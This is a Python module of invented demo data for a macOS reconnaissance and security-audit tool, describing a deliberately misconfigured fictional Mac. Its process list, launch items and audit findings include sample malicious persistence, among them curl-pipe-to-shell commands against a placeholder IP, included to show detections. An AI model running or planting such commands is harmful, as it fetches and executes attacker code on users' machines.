"""A synthetic Mac, used for demos, screenshots and non-macOS development.

Every value here is invented. The host is a fictional lab machine
("recon-lab" / user "analyst"), addresses come from the RFC 5737 and RFC 3849
documentation ranges, and the serial and UUID are structurally valid but not
issued to any real device.

This dataset is what the README screenshots are captured from. That is the
point: the screenshots of a reconnaissance tool must never be a screenshot of
someone's actual machine, and the only way to guarantee that is for the
screenshot path to have no route to real data at all.

The fictional host is deliberately *badly configured* -- FileVault off, guest
enabled, a malicious launch agent -- so the audit page demonstrates real
findings instead of a wall of green.
"""

from __future__ import annotations

from .model import Category, Finding, Severity


def system_demo() -> Category:
    cat = Category("system", "System", "🖥",
                   "Operating system, kernel and boot state")

    s = cat.new_section("Operating System")
    s.kv("Product", "macOS")
    s.kv("Version", "26.1")
    s.kv("Build", "25B74")
    s.kv("Codename", "Tahoe")
    s.kv("Kernel", "Darwin Kernel Version 25.1.0: Tue Oct 21 20:14:32 PDT 2025")
    s.kv("Kernel Release", "25.1.0")
    s.kv("Architecture", "arm64")
    s.kv("Silicon", "Apple Silicon")

    s = cat.new_section("Identity")
    s.kv("Computer Name", "recon-lab")
    s.kv("Local Hostname", "recon-lab")
    s.kv("Host Name", "(not set)")
    s.kv("Current User", "analyst")
    s.kv("Running As", "standard user")

    s = cat.new_section("Boot & Runtime")
    s.kv("Boot Time", "2026-02-09 08:12:44")
    s.kv("Uptime", "3d 6h 21m")
    s.kv("Boot Volume", "/")
    s.kv("Boot Args", "Default")
    s.kv("Rosetta 2", "Installed")
    s.kv("Translated Process", "No")

    s = cat.new_section("Locale & Time")
    s.kv("Time Zone", "Asia/Kolkata")
    s.kv("Local Time", "2026-02-12 14:33:07")
    s.kv("Language", "en_US.UTF-8")

    s = cat.new_section("Security Posture")
    s.kv("System Integrity Protection", "Enabled")
    s.kv("FileVault", "Off")
    s.kv("Gatekeeper", "Enabled")
    s.kv("Firewall", "Off")
    s.kv("Stealth Mode", "Off")
    s.kv("XProtect Version", "5289")
    s.kv("Automatic Updates", "Disabled")
    s.note = "Read-only posture snapshot. See Security Audit for graded findings."
    return cat


def hardware_demo() -> Category:
    cat = Category("hardware", "Hardware", "⚙",
                   "Model, silicon, memory, storage and power")

    s = cat.new_section("Machine")
    s.kv("Model Name", "MacBook Pro")
    s.kv("Model Identifier", "Mac16,8")
    s.kv("Model Number", "MX2J3XX/A")
    s.kv("Chip", "Apple M4 Pro")
    s.kv("Total Cores", "14 (10 performance + 4 efficiency)")
    s.kv("Memory", "24 GB")
    s.kv("Serial Number", "X7K9QW2LMN", sensitive=True)
    s.kv("Hardware UUID", "4C4C4544-0037-5A10-8051-B4C04F515A33", sensitive=True)
    s.kv("Provisioning UDID", "00008103-000E4D2A1E88001C", sensitive=True)
    s.kv("Activation Lock", "Enabled")
    s.kv("Boot ROM Version", "18000.160.9")
    s.kv("OS Loader Version", "18000.160.9")

    s = cat.new_section("Processor")
    s.kv("Brand", "Apple M4 Pro")
    s.kv("Physical Cores", "14")
    s.kv("Logical Cores", "14")
    s.kv("L1 Cache (data)", "128.0 KB")
    s.kv("L2 Cache", "16.0 MB")
    s.kv("Page Size", "16.0 KB")
    s.kv("Byte Order", "little-endian")

    s = cat.new_section("Memory")
    s.kv("Total Physical", "24.0 GB")
    s.kv("Free", "1.8 GB")
    s.kv("Active", "8.4 GB")
    s.kv("Inactive", "7.9 GB")
    s.kv("Wired", "3.2 GB")
    s.kv("Compressed", "2.1 GB")
    s.kv("Swap", "total = 2048.00M  used = 412.25M  free = 1635.75M")

    s = cat.new_section(
        "Storage", kind="table",
        headers=["Volume", "Size", "Used", "Free", "Used %", "Filesystem"])
    s.add_row("/", "994.7 GB", "9.8 GB", "612.4 GB", "2%", "/dev/disk3s1s1")
    s.add_row("/System/Volumes/Data", "994.7 GB", "358.1 GB", "612.4 GB", "37%",
              "/dev/disk3s5")

    s = cat.new_section(
        "Graphics & Displays", kind="table",
        headers=["Chipset", "Type", "Cores/VRAM", "Displays"])
    s.add_row("Apple M4 Pro", "Built-In", "20", "Built-in Liquid Retina XDR")
    s.add_row("DELL U2723QE", "External", "—", "DELL U2723QE")

    s = cat.new_section("Power & Battery")
    s.kv("Charge", "87%")
    s.kv("State", "Discharging")
    s.kv("Power Source", "Battery Power")
    s.kv("Cycle Count", "142")
    s.kv("Condition", "Normal")
    s.kv("Maximum Capacity", "94%")
    return cat


def users_demo() -> Category:
    cat = Category("users", "Users", "👤",
                   "Accounts, privileges, sessions and login history")

    s = cat.new_section(
        "User Accounts", kind="table",
        headers=["User", "UID", "Real Name", "Admin", "Shell", "Home"],
        sensitive_cols=[0, 2, 5])
    s.add_row("analyst", "501", "Security Analyst", "Yes", "/bin/zsh",
              "/Users/analyst")
    s.add_row("devops", "502", "Build Service", "Yes", "/bin/bash",
              "/Users/devops")
    s.add_row("guest", "503", "Guest User", "No", "/bin/bash", "/Users/guest")
    s.add_row("contractor", "504", "External Contractor", "Yes", "/bin/zsh",
              "/Users/contractor")

    s = cat.new_section(
        "Service Accounts", kind="table", headers=["User", "UID", "Shell"])
    for name, uid in [("_analyticsd", "263"), ("_appleevents", "55"),
                      ("_atsserver", "97"), ("_avphidbeacon", "212"),
                      ("_coreaudiod", "202"), ("_cvmsroot", "212"),
                      ("_displaypolicyd", "244"), ("_driverkit", "244"),
                      ("_fpsd", "265"), ("_hidd", "261")]:
        s.add_row(name, uid, "/usr/bin/false")
    s.note = ("87 system/service principals (UID < 500). Expected on every Mac; "
              "listed for completeness.")

    s = cat.new_section(
        "Privileged Groups", kind="table", headers=["Group", "Members"],
        sensitive_cols=[1])
    s.add_row("admin", "analyst, contractor, devops, root")
    s.add_row("wheel", "root")
    s.add_row("staff", "analyst, contractor, devops")
    s.add_row("com.apple.access_ssh", "analyst, devops")
    s.note = ("admin = sudo-capable. com.apple.access_ssh gates Remote Login "
              "when it is restricted to specific users.")

    s = cat.new_section(
        "Active Sessions", kind="table",
        headers=["User", "TTY", "Since", "From"], sensitive_cols=[0, 3])
    s.add_row("analyst", "console", "Feb 9 08:13", "local")
    s.add_row("analyst", "ttys000", "Feb 12 09:41", "local")
    s.add_row("devops", "ttys004", "Feb 12 11:02", "192.168.4.22")

    s = cat.new_section(
        "Recent Logins", kind="table",
        headers=["User", "TTY", "From", "When"], sensitive_cols=[0, 2])
    s.add_row("devops", "ttys004", "192.168.4.22", "Wed Feb 12 11:02 still logged in")
    s.add_row("analyst", "ttys000", "local", "Wed Feb 12 09:41 still logged in")
    s.add_row("contractor", "ttys003", "203.0.113.44", "Tue Feb 11 23:17 - 02:04")
    s.add_row("analyst", "console", "local", "Mon Feb 9 08:13 still logged in")
    s.note = "From wtmp via `last`. Gaps here can indicate log tampering."

    s = cat.new_section(
        "SSH Keys & Trust", kind="table",
        headers=["User", "File", "Type", "Encrypted"], sensitive_cols=[0])
    s.add_row("analyst", "~/.ssh/id_ed25519", "OpenSSH", "Yes")
    s.add_row("analyst", "~/.ssh/authorized_keys", "2 trusted key(s)", "—")
    s.add_row("devops", "~/.ssh/id_rsa", "RSA (PEM)", "No")
    s.add_row("contractor", "~/.ssh/id_ecdsa", "OpenSSH", "No")
    s.note = ("An unencrypted private key is a credential any process running "
              "as that user can copy silently.")
    return cat


def network_demo() -> Category:
    cat = Category("network", "Network", "🌐",
                   "Interfaces, Wi-Fi, DNS, routing and open sockets")

    s = cat.new_section(
        "Interfaces", kind="table",
        headers=["Port", "Device", "MAC", "IPv4", "Status"],
        sensitive_cols=[2, 3])
    s.add_row("Wi-Fi", "en0", "a4:83:e7:2b:9f:41", "192.168.4.31", "active")
    s.add_row("Thunderbolt Bridge", "bridge0", "36:7d:da:1c:00:81", "—",
              "inactive")
    s.add_row("USB 10/100/1000 LAN", "en5", "00:e0:4c:68:12:aa", "10.20.14.7",
              "active")
    s.add_row("utun3 (VPN)", "utun3", "—", "10.99.0.14", "active")

    s = cat.new_section("Wi-Fi")
    s.kv("Interface", "en0")
    s.kv("Card Type", "Wi-Fi (802.11 a/b/g/n/ac/ax/be)")
    s.kv("Firmware", "22.10.1027.4")
    s.kv("MAC Address", "a4:83:e7:2b:9f:41", sensitive=True)
    s.kv("Country Code", "IN")
    s.kv("Current SSID", "CORP-SECURE", sensitive=True)
    s.kv("Channel", "149 (5GHz, 80MHz)")
    s.kv("Security", "WPA2 Enterprise")
    s.kv("PHY Mode", "802.11ax")
    s.kv("Signal / Noise", "-52 dBm / -91 dBm")
    s.kv("Transmit Rate", "1200")

    s = cat.new_section(
        "Nearby Networks", kind="table",
        headers=["SSID", "Channel", "Security", "Signal"], sensitive_cols=[0])
    for ssid, ch, secmode, sig in [
        ("CORP-GUEST", "36 (5GHz, 80MHz)", "Open (no encryption)", "-58 dBm"),
        ("CORP-IOT", "6 (2GHz, 20MHz)", "WPA2 Personal", "-61 dBm"),
        ("Cafe-Free-WiFi", "11 (2GHz, 20MHz)", "Open (no encryption)", "-74 dBm"),
        ("HP-Print-4F2A", "1 (2GHz, 20MHz)", "WEP (broken)", "-79 dBm"),
        ("NETGEAR58", "44 (5GHz, 40MHz)", "WPA2/WPA3 Transition", "-81 dBm"),
        ("SETUP-9C21", "6 (2GHz, 20MHz)", "WPA2 Personal", "-86 dBm"),
    ]:
        s.add_row(ssid, ch, secmode, sig)
    s.note = ("17 networks seen by the Wi-Fi radio. Open or WEP networks "
              "nearby are worth noting on an assessment.")

    s = cat.new_section("DNS & Routing")
    s.kv("Default Gateway", "192.168.4.1")
    s.kv("Nameservers", "192.168.4.1, 1.1.1.1")
    s.kv("Search Domains", "corp.internal")
    s.kv("Proxies", "None configured")

    s = cat.new_section(
        "VPN Configurations", kind="table",
        headers=["Name", "Type", "Status"], sensitive_cols=[0])
    s.add_row("Corp VPN (IKEv2)", "IPSec", "Connected")
    s.add_row("Lab Tunnel", "L2TP", "Disconnected")

    s = cat.new_section(
        "ARP Neighbours", kind="table",
        headers=["IP Address", "MAC", "Interface"], sensitive_cols=[0, 1])
    for ip, mac, iface in [
        ("192.168.4.1", "b0:39:56:1f:22:0a", "en0"),
        ("192.168.4.22", "3c:22:fb:81:4d:11", "en0"),
        ("192.168.4.44", "3c:22:fb:81:4d:11", "en0"),
        ("192.168.4.90", "f0:18:98:0c:71:e2", "en0"),
        ("10.20.14.1", "00:1b:21:3a:9c:05", "en5"),
    ]:
        s.add_row(ip, mac, iface)
    s.note = ("Passively read from the local ARP cache — no hosts were probed. "
              "Two IPs sharing one MAC can indicate spoofing.")

    s = cat.new_section(
        "Listening Ports", kind="table",
        headers=["Proto", "Local Address", "Port", "Service", "Exposure"],
        sensitive_cols=[1])
    for proto, addr, port, svc, exp in [
        ("tcp4", "*", "22", "SSH", "All interfaces"),
        ("tcp4", "*", "5900", "VNC / Screen Sharing", "All interfaces"),
        ("tcp4", "*", "8080", "HTTP alt", "All interfaces"),
        ("tcp4", "127.0.0.1", "3306", "MySQL", "Loopback only"),
        ("tcp4", "127.0.0.1", "5432", "PostgreSQL", "Loopback only"),
        ("tcp4", "127.0.0.1", "6379", "Redis", "Loopback only"),
        ("tcp6", "::1", "631", "CUPS / printing", "Loopback only"),
        ("udp4", "*", "5353", "mDNS", "All interfaces"),
    ]:
        s.add_row(proto, addr, port, svc, exp)
    s.note = ("Exposure reflects the bind address: loopback is reachable only "
              "from this Mac; all-interfaces is reachable from the network.")
    return cat


def software_demo() -> Category:
    cat = Category("software", "Software", "📦",
                   "Applications, packages, extensions and code signing")

    s = cat.new_section(
        "Applications", kind="table",
        headers=["Application", "Version", "Bundle ID", "Signed By"])
    for nm, ver, bid, sig in [
        ("Burp Suite Community", "2025.11.2", "com.portswigger.burp",
         "Developer ID: PortSwigger Ltd (N95PLR9743)"),
        ("Docker", "4.38.0", "com.docker.docker",
         "Developer ID: Docker Inc (9BNSXJN65R)"),
        ("Firefox", "144.0.1", "org.mozilla.firefox",
         "Developer ID: Mozilla Corporation (43AQ936H96)"),
        ("Ghidra", "11.3", "org.ghidra.framework", "Unsigned / ad-hoc"),
        ("Google Chrome", "141.0.7390.65", "com.google.Chrome",
         "Developer ID: Google LLC (EQHXZ8M8AV)"),
        ("Nmap", "7.98", "org.insecure.nmap", "Unsigned / ad-hoc"),
        ("Visual Studio Code", "1.98.1", "com.microsoft.VSCode",
         "Developer ID: Microsoft Corporation (UBF8T346G9)"),
        ("Wireshark", "4.4.3", "org.wireshark.Wireshark",
         "Developer ID: Wireshark Foundation (7Z6EMTD2C6)"),
        ("Safari", "26.1", "com.apple.Safari", "Apple"),
        ("Terminal", "2.15", "com.apple.Terminal", "Apple"),
        ("Xcode", "26.1", "com.apple.dt.Xcode", "Apple"),
    ]:
        s.add_row(nm, ver, bid, sig)
    s.note = "126 bundles found. Signature verified for the first 42 third-party apps."

    s = cat.new_section(
        "Unsigned & Quarantined", kind="table",
        headers=["Application", "Issue", "Path"])
    s.add_row("Ghidra", "No valid code signature", "/Applications/Ghidra.app")
    s.add_row("Nmap", "No valid code signature", "/Applications/Nmap.app")
    s.add_row("SystemHelper", "Quarantine xattr set (downloaded)",
              "/Applications/SystemHelper.app")
    s.note = ("Unsigned bundles bypass Gatekeeper's identity guarantee — "
              "confirm provenance before trusting them.")

    s = cat.new_section(
        "Homebrew Packages", kind="table", headers=["Formula", "Version"])
    for f, v in [("bettercap", "2.41.1"), ("hashcat", "6.2.6"),
                 ("john", "1.9.0-jumbo-1"), ("masscan", "1.3.2"),
                 ("nmap", "7.98"), ("openssl@3", "3.5.1"),
                 ("python@3.13", "3.13.2"), ("radare2", "5.9.8"),
                 ("sqlmap", "1.9.2"), ("wireshark", "4.4.3")]:
        s.add_row(f, v)
    s.note = "34 formulae installed."

    s = cat.new_section("Installer Receipts", kind="table",
                        headers=["Package ID"])
    for pid in ["com.docker.pkg.docker", "com.google.pkg.Chrome",
                "com.microsoft.package.VSCode",
                "com.portswigger.burpsuite.community",
                "org.wireshark.ChmodBPF.pkg", "org.python.Python.PythonFramework"]:
        s.add_row(pid)
    s.note = ("312 receipts total, 19 non-Apple. Receipts persist after an app "
              "is deleted — useful history.")

    s = cat.new_section(
        "System Extensions", kind="table",
        headers=["Bundle ID", "Team", "Name", "State"])
    s.add_row("com.docker.vmnetd", "9BNSXJN65R", "Docker Network Extension",
              "activated enabled")
    s.add_row("com.crowdstrike.falcon.Agent", "X9E956P446",
              "Falcon Endpoint Security", "activated enabled")
    s.note = ("System extensions run with elevated privilege — network and "
              "endpoint-security extensions can see all traffic.")

    s = cat.new_section(
        "Third-Party Kernel Extensions", kind="table",
        headers=["Index", "Bundle ID", "Version"])
    s.note = ("No third-party kernel extensions loaded — the modern, healthy "
              "state on Apple Silicon.")
    return cat


def processes_demo() -> Category:
    cat = Category("processes", "Processes", "⚡",
                   "Running processes, launchd jobs and persistence")

    s = cat.new_section(
        "Top Processes by CPU", kind="table",
        headers=["PID", "User", "CPU %", "MEM %", "Started", "Command"],
        sensitive_cols=[1, 5])
    for pid, user, cpu, mem, st, cmd in [
        ("payload", "analyst", "48.2", "3.1", "Wed Feb 12 09:41:02 2026",
         "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
        ("612", "root", "12.7", "0.9", "Mon Feb  9 08:12:51 2026",
         "/usr/sbin/mDNSResponder"),
        ("1284", "analyst", "9.4", "6.2", "Wed Feb 12 09:44:18 2026",
         "/Applications/Docker.app/Contents/MacOS/com.docker.backend"),
        ("88213", "analyst", "6.1", "1.4", "Wed Feb 12 14:02:55 2026",
         "/opt/homebrew/bin/python3.13 recon.py"),
        ("341", "root", "3.3", "0.4", "Mon Feb  9 08:12:44 2026",
         "/usr/libexec/opendirectoryd"),
        ("77120", "analyst", "2.8", "0.7", "Wed Feb 12 13:58:31 2026",
         "/bin/zsh -c curl -fsSL hxxp://198.51.100.23/x | sh"),
        ("509", "_windowserver", "2.2", "2.9", "Mon Feb  9 08:12:49 2026",
         "/System/Library/PrivateFrameworks/SkyLight.framework/WindowServer"),
    ]:
        s.add_row(pid if pid != "payload" else "9902", user, cpu, mem, st, cmd)

    s = cat.new_section("Process Summary")
    s.kv("Total Processes", "487")
    s.kv("Running as root", "132")
    s.kv("Running as you", "301")
    s.kv("Load Average", "{ 2.14 1.98 1.77 }")

    s = cat.new_section(
        "Third-Party Launch Items", kind="table",
        headers=["Label", "Scope", "Program", "RunAtLoad", "Flag"],
        sensitive_cols=[2])
    for label, scope, prog, ral, flag in [
        ("com.apple.softwareupdated.helper", "User Agent",
         "/bin/sh -c curl -fsSL hxxp://198.51.100.23/beacon | sh", "Yes",
         "⚠ downloads or evals code"),
        ("com.updater.agent", "User Agent",
         "/Users/Shared/.hidden/updater", "Yes", "⚠ world-writable path"),
        ("com.docker.helper", "User Agent",
         "/Applications/Docker.app/Contents/MacOS/Docker Desktop.app/Contents/"
         "MacOS/Docker Desktop --autostart", "Yes", ""),
        ("com.crowdstrike.falcond", "Global Daemon",
         "/Library/CS/falcond", "Yes", "keep-alive"),
        ("com.google.keystone.daemon", "Global Daemon",
         "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/"
         "Contents/Helpers/GoogleSoftwareUpdateDaemon", "No", "scheduled"),
        ("org.wireshark.ChmodBPF", "Global Daemon",
         "/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF", "Yes", ""),
    ]:
        s.add_row(label, scope, prog, ral, flag)
    s.note = ("6 third-party launch items across user, global and daemon scopes "
              "(214 Apple items excluded). Every one of these runs "
              "automatically — this is the first place to look for persistence.")

    s = cat.new_section(
        "Loaded launchd Jobs", kind="table",
        headers=["PID", "Status", "Label"])
    for pid, status, label in [
        ("1284", "0", "com.docker.helper"),
        ("-", "0", "com.google.keystone.daemon"),
        ("772", "0", "com.crowdstrike.falcond"),
        ("9902", "0", "com.apple.softwareupdated.helper"),
        ("-", "1", "com.updater.agent"),
        ("610", "0", "org.wireshark.ChmodBPF"),
    ]:
        s.add_row(pid, status, label)
    s.note = ("6 non-Apple jobs currently loaded in launchd. A non-zero Status "
              "is a job that ran and exited with an error.")

    s = cat.new_section(
        "Scheduled Tasks", kind="table", headers=["Source", "Entry"],
        sensitive_cols=[1])
    s.add_row("user crontab",
              "*/10 * * * * /Users/Shared/.hidden/sync.sh >/dev/null 2>&1")
    s.note = "cron still works on macOS and is far less monitored than launchd."
    return cat


def audit_demo() -> Category:
    cat = Category("audit", "Security Audit", "🛡",
                   "Graded findings with remediation guidance")
    s = cat.new_section("Findings", kind="findings")

    findings = [
        Finding(
            "Suspicious launch item: com.apple.softwareupdated.helper",
            Severity.HIGH,
            "A User Agent launch item runs `/bin/sh -c curl -fsSL "
            "hxxp://198.51.100.23/beacon | sh` (downloads or evals code). The "
            "label impersonates an Apple service, but Apple's own jobs live in "
            "/System/Library and are signed. Legitimate software does not "
            "persist by fetching and evaluating a remote script at load time.",
            "Inspect the plist and the program it points at. If you did not "
            "install it, treat this Mac as compromised until proven otherwise.",
            "~/Library/LaunchAgents/com.apple.softwareupdated.helper.plist"),
        Finding(
            "Suspicious launch item: com.updater.agent", Severity.HIGH,
            "A User Agent launch item runs `/Users/Shared/.hidden/updater` "
            "(world-writable path). /Users/Shared is writable by every account "
            "on this Mac, so any local user can replace that binary and have it "
            "executed at login.",
            "Inspect the plist and the program it points at. If you did not "
            "install it, treat this Mac as compromised until proven otherwise.",
            "~/Library/LaunchAgents/com.updater.agent.plist"),
        Finding(
            "FileVault disk encryption is off", Severity.HIGH,
            "The internal disk is not encrypted at rest. Anyone with physical "
            "access can read every file by booting to Recovery or attaching "
            "the Mac in target-disk mode — no password needed.",
            "Enable in System Settings → Privacy & Security → FileVault, and "
            "store the recovery key somewhere other than this Mac.",
            "fdesetup status -> FileVault is Off."),
        Finding(
            "3 accounts have administrator rights", Severity.LOW,
            "Admin group members: analyst, contractor, devops. Each is a "
            "sudo-capable path to root, so each is an equivalent target.",
            "Reduce to the minimum set and use standard accounts for "
            "day-to-day work.",
            "dscl . -read /Groups/admin GroupMembership"),
        Finding(
            "Application firewall is off", Severity.MEDIUM,
            "Incoming connections are not filtered. Any service currently "
            "listening on a non-loopback address is reachable by every host on "
            "the local network — see the Network page for what is actually "
            "exposed.",
            "Enable in System Settings → Network → Firewall.",
            "socketfilterfw --getglobalstate -> Firewall is disabled. (State = 0)"),
        Finding(
            "4 service(s) listening on all interfaces", Severity.MEDIUM,
            "Bound to 0.0.0.0 or ::, reachable from the network: 22/SSH, "
            "5900/VNC / Screen Sharing, 8080/HTTP alt, 5353/mDNS. The firewall "
            "is off, so these are reachable right now by any host on the same "
            "network.",
            "Bind development services to 127.0.0.1, and turn off sharing "
            "services you are not using.",
            "netstat -an | grep LISTEN"),
        Finding(
            "Remote Login (SSH) is enabled", Severity.MEDIUM,
            "sshd is accepting connections. This is a fully remote, "
            "pre-authentication attack surface and the most common "
            "brute-force target on an exposed Mac.",
            "Disable it if unused (System Settings → General → Sharing). If "
            "needed, restrict it to key-only auth and limit access to the "
            "com.apple.access_ssh group.",
            "systemsetup -getremotelogin -> Remote Login: On"),
        Finding(
            "Screen Sharing (VNC) is enabled", Severity.MEDIUM,
            "The screen-sharing service is running, exposing an interactive "
            "remote session on port 5900.",
            "Disable in System Settings → General → Sharing if not required.",
            "launchctl list | grep com.apple.screensharing"),
        Finding(
            "Guest account is enabled", Severity.MEDIUM,
            "An unauthenticated user can log in and get local code execution, "
            "which is a foothold for local privilege-escalation chains.",
            "Disable the Guest User in System Settings → Users & Groups.",
            "GuestEnabled = 1"),
        Finding(
            "Automatic update checks are disabled", Severity.MEDIUM,
            "macOS is not checking for security updates. Apple ships "
            "actively-exploited fixes through this channel, often without a "
            "full OS upgrade.",
            "Re-enable in System Settings → General → Software Update.",
            "AutomaticCheckEnabled=0 AutomaticDownload=0"),
        Finding(
            "2 SSH private key(s) without a passphrase", Severity.MEDIUM,
            "These private keys are stored unencrypted: ~/.ssh/id_rsa, "
            "~/.ssh/id_ecdsa. Any process running as that user can copy them "
            "silently and reuse them anywhere they are trusted.",
            "Add a passphrase with `ssh-keygen -p -f <keyfile>`, and consider "
            "moving to a hardware-backed key.",
            "~/.ssh key headers"),
        Finding(
            "Firewall stealth mode is off", Severity.LOW,
            "The Mac answers ICMP pings and probes to closed ports, confirming "
            "its presence to anyone sweeping the subnet.",
            "Enable stealth mode in the firewall's Options panel.",
            "Firewall stealth mode is off"),
        Finding(
            "System Integrity Protection is enabled", Severity.GOOD,
            "SIP is protecting system locations, restricting kernel extension "
            "loading, and preventing injection into Apple binaries.",
            "", "csrutil status -> System Integrity Protection status: enabled."),
        Finding(
            "Gatekeeper is enabled", Severity.GOOD,
            "Applications are checked for a valid signature and notarisation "
            "before first run.",
            "", "spctl --status -> assessments enabled"),
        Finding(
            "Scan ran without root — some checks were limited", Severity.INFO,
            "MacRecon deliberately runs unprivileged by default. A few checks "
            "(sudoers contents, firmware password, full BTM login items) need "
            "root and reported Unknown rather than guessing.",
            "For a complete audit run `sudo python3 macrecon.py --cli`. Read "
            "the source first — never run a security tool as root on someone "
            "else's word, including mine.",
            "euid=501"),
    ]
    findings.sort(key=lambda f: f.severity.rank)
    for f in findings:
        s.add_finding(f)
    return cat
